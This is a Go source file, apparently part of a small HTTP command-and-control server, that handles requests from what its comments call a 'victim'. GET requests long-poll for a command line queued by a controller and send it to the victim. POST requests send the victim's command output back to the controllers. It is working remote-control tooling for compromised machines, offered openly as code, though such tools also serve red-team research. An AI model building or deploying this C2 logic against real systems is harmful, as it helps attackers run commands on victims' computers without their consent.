package main

/*
 * handleClient.go
 * Handle a client (victim)
 * By J. Stuart McMurray
 * Created 20170518
 * Last Modified 20170518
 */

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"time"
)

const (
	/* POLLTO gives up on a poll after a while to avoid file descriptor
	leakage */
	POLLTO = time.Minute
)

/* handleClient is called whenever a client (victim) sends an HTTP request */
func handleClient(w http.ResponseWriter, r *http.Request) {
	/* Don't leak filedescriptors */
	defer r.Body.Close()

	/* Make sure we have and Endpoint for this client */
	e := GetEndpoint(r.URL.Path)
	e.LastBeacon = time.Now()

	switch r.Method {
	case http.MethodGet: /* Poll for command */
		handleGet(w, r, e)
	case http.MethodPost: /* Command output */
		handlePost(w, r, e)
	default:
		http.Error(
			w,
			"Unsupported method",
			http.StatusBadRequest,
		)
		return
	}
}

/* handleGet lets the client hang until we have some sort of input, or the
connection times out, or we give up */
func handleGet(w http.ResponseWriter, r *http.Request, e *Endpoint) {
	/* Make sure we're the only handler */
	select {
	case <-e.PollGuard:
		/* Got the token */
	default:
		/* Read would have blocked, someone else has the token */
		return
	}
	/* Put the token back on return */
	defer func() { e.PollGuard <- struct{}{} }()

	/* If we don't have a line to send, get one from a controller */
	if "" == e.NextLine {
		select {
		case e.NextLine = <-e.CtoV:
		case <-time.After(POLLTO):
			return
		}
	}

	/* Try to send it to the victim */
	if _, err := w.Write([]byte(e.NextLine)); nil != err {
		log.Printf("[%v] Write error: %v", e.Name, err)
		return
	}
	log.Printf("[%v] Sent %q", e.Name, e.NextLine)

	/* Tell the controllers we've sent it */
	e.TellControllers([]byte(fmt.Sprintf(" -> %q\n", e.NextLine)))

	/* Clear buffer for next time */
	e.NextLine = ""
}

/* handlePost sends the body of POST messages to the controller */
func handlePost(w http.ResponseWriter, r *http.Request, e *Endpoint) {
	/* Get contents of POST */
	b, err := ioutil.ReadAll(r.Body)
	if nil != err {
		log.Printf("[%v] Unable to read inbound data", e.Name)
		return
	}
	if 0 == len(b) {
		log.Printf("[%v] Empty inbound data", e.Name)
		return
	}

	e.TellControllers(b)
}
